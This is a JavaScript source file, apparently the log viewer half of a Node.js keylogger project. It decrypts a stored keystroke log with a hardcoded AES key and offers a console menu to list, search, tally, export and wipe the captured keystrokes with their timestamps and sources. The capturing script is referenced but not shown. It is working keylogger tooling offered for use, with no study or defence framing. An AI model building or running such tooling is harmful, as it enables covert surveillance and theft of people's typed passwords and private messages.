'use strict';

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const readline = require('readline');

const LOG_FILE = path.join(__dirname, 'logs', 'keystrokes.log');
const SECRET_KEY = 'node-keylogger-secret-32-chars!!'; // Same 32-char key as index.js

function decrypt(encryptedData) {
  try {
    const parts = encryptedData.split(':');
    if (parts.length !== 2) return null;
    const iv = Buffer.from(parts[0], 'hex');
    const encrypted = parts[1];
    const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(SECRET_KEY), iv);
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
  } catch (err) {
    return null;
  }
}

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

function showMenu() {
  console.log('\n╔══════════════════════════════════════╗');
  console.log('║     KEYLOGGER SECURE LOG VIEWER      ║');
  console.log('╠══════════════════════════════════════╣');
  console.log('║  1. View all logs                    ║');
  console.log('║  2. Search by key                    ║');
  console.log('║  3. Search by date (YYYY-MM-DD)      ║');
  console.log('║  4. Show statistics                  ║');
  console.log('║  5. Export to JSON                   ║');
  console.log('║  6. Clear all logs                   ║');
  console.log('║  7. Exit                             ║');
  console.log('╚══════════════════════════════════════╝');

  rl.question('\nSelect option: ', handleChoice);
}

function handleChoice(choice) {
  switch(choice.trim()) {
    case '1': viewAll(); break;
    case '2': rl.question('Enter key to search: ', (k) => { search('key', k); }); break;
    case '3': rl.question('Enter date (YYYY-MM-DD): ', (d) => { search('date', d); }); break;
    case '4': showStats(); break;
    case '5': exportLogs(); break;
    case '6': clearLogs(); break;
    case '7': console.log('Goodbye!'); rl.close(); return;
    default: console.log('Invalid option!'); showMenu();
  }
}

function readLogs() {
  if (!fs.existsSync(LOG_FILE)) {
    console.log('No log file found. Run keylogger first!');
    return [];
  }
  const data = fs.readFileSync(LOG_FILE, 'utf8').trim();
  if (!data) return [];
  return data.split('\n').filter(line => line.trim());
}

function viewAll() {
  const lines = readLogs();
  if (!lines.length) { showMenu(); return; }

  console.log('\n┌─────────────────────────┬─────────────────────┬────────────┐');
  console.log('│ TIMESTAMP               │ KEY                 │ SOURCE     │');
  console.log('├─────────────────────────┼─────────────────────┼────────────┤');

  lines.forEach(line => {
    const decrypted = decrypt(line);
    if (!decrypted) return;
    try {
      const entry = JSON.parse(decrypted);
      const ts = entry.timestamp.substring(0, 19).padEnd(23);
      const key = (entry.key || '?').padEnd(19);
      const src = (entry.source || '?').padEnd(10);
      console.log(`│ ${ts} │ ${key} │ ${src} │`);
    } catch (e) {}
  });
  console.log('└─────────────────────────┴─────────────────────┴────────────┘');
  console.log(`Total entries: ${lines.length}`);
  showMenu();
}

function search(type, query) {
  const lines = readLogs();
  let matches = 0;
  console.log(`\n=== Search Results for "${query}" ===`);

  lines.forEach(line => {
    const decrypted = decrypt(line);
    if (!decrypted) return;
    try {
      const entry = JSON.parse(decrypted);
      const match = type === 'key' 
        ? entry.key.toLowerCase() === query.toLowerCase()
        : entry.timestamp.startsWith(query);
      if (match) {
        console.log(`${entry.timestamp} | ${entry.key} | ${entry.source}`);
        matches++;
      }
    } catch (e) {}
  });

  console.log(`Matches found: ${matches}`);
  showMenu();
}

function showStats() {
  const lines = readLogs();
  const keys = {}, sources = {};
  let total = 0;

  lines.forEach(line => {
    const decrypted = decrypt(line);
    if (!decrypted) return;
    try {
      const entry = JSON.parse(decrypted);
      keys[entry.key] = (keys[entry.key] || 0) + 1;
      sources[entry.source] = (sources[entry.source] || 0) + 1;
      total++;
    } catch (e) {}
  });

  console.log('\n=== Keystroke Statistics ===');
  console.log(`Total keystrokes: ${total}`);

  console.log('\nBy Source:');
  Object.entries(sources).forEach(([src, count]) => {
    console.log(`  ${src.padEnd(10)} : ${count}`);
  });

  console.log('\nTop 10 Keys:');
  Object.entries(keys)
    .sort((a, b) => b[1] - a[1])
    .slice(0, 10)
    .forEach(([key, count]) => {
      console.log(`  ${key.padEnd(15)} : ${count} times`);
    });
  showMenu();
}

function exportLogs() {
  const lines = readLogs();
  const decrypted = [];

  lines.forEach(line => {
    const dec = decrypt(line);
    if (dec) {
      try { decrypted.push(JSON.parse(dec)); } catch (e) {}
    }
  });

  const exportFile = path.join(__dirname, 'logs', `export-${Date.now()}.json`);
  fs.writeFileSync(exportFile, JSON.stringify(decrypted, null, 2));
  console.log(`Exported ${decrypted.length} entries to: ${exportFile}`);
  showMenu();
}

function clearLogs() {
  rl.question('Are you sure? Type "yes" to confirm: ', (confirm) => {
    if (confirm.toLowerCase() === 'yes') {
      fs.writeFileSync(LOG_FILE, '');
      console.log('All logs cleared!');
    } else {
      console.log('Cancelled.');
    }
    showMenu();
  });
}

console.log('Loading secure log viewer...');
showMenu();
